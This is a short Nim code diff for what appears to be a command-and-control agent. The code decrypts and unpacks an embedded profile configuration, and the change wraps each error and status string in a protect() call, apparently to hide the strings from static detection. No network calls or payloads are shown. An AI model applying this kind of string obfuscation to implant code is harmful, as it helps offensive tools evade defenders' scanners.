@@ -18,7 +18,7 @@ proc deserializeConfiguration(config: string): AgentCtx =
     wipeKey(aesKey)
 
     if gmac != authTag: 
-        raise newException(CatchableError, "Invalid authentication tag.")
+        raise newException(CatchableError, protect("Invalid authentication tag."))
 
     # Parse decrypted profile configuration 
     unpacker = Unpacker.init(Bytes.toString(decData))
@@ -37,14 +37,14 @@ proc deserializeConfiguration(config: string): AgentCtx =
 
     wipeKey(agentKeyPair.privateKey)
     
-    echo "[+] Profile configuration deserialized."
+    echo protect("[+] Profile configuration deserialized.")
     return ctx
 
 proc init*(T: type AgentCtx): AgentCtx = 
 
     try: 
         when not defined(CONFIGURATION):
-            raise newException(CatchableError, "Missing agent configuration.")
+            raise newException(CatchableError, protect("Missing agent configuration."))
 
         return deserializeConfiguration(CONFIGURATION)
 
